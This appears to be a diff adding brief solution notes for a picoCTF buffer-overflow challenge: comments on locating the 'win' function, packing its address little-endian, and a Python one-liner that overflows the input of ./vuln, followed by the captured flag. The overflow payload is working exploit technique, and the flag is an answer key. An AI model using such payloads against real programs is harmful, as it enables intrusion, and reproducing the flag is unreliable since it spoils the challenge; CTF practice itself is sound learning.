@@ -1,0 +1,7 @@
+# look at the program and identify the function "win" is what gets the flag
+# find the address of "win"; find the little endian address of it
+# python -c "import struct; print repr(struct.pack('<I', 0x080485cb))"
+# gives " '\xcb\x85\x04\x08' "
+# take that and add it to your input
+# python -c "import struct; print 'A'*44 +  struct.pack('<I', 0x080485cb)" |./vuln
+picoCTF{addr3ss3s_ar3_3asy3656a9b3}
